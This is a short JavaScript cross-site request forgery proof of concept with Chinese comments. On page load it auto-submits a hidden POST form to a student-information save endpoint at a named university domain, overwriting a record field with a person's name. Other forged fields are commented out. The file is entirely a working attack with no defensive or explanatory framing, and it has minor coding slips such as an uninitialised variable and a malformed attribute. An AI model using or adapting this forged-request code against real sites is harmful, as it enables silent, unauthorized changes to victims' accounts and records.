function forge_post()
{
var fields;
fields += "<input type'hidden' name='ywxm' value='zhujianqi'>";
//fields += "<input type='hidden' name='briefdescription' value='POLAND'>";
//fields += "<input type='hidden' name='accesslevel[briefdescription]'value='2'>"; 
//fields += "<input type='hidden' name='guid' value='42'>";
// 创建一个表单元素
var p = document.createElement("form");
// 制作表单
p.action = "http://bkjws.sdu.edu.cn/b/grxx/xs/xjxx/save";
p.innerHTML = fields;
p.method = "post";
// 将表单附加到当前页面。
document.body.appendChild(p);
// 提交表单
p.submit();
}
// Invoke forge_post() after the page is loaded.
window.onload = function() { forge_post(); }
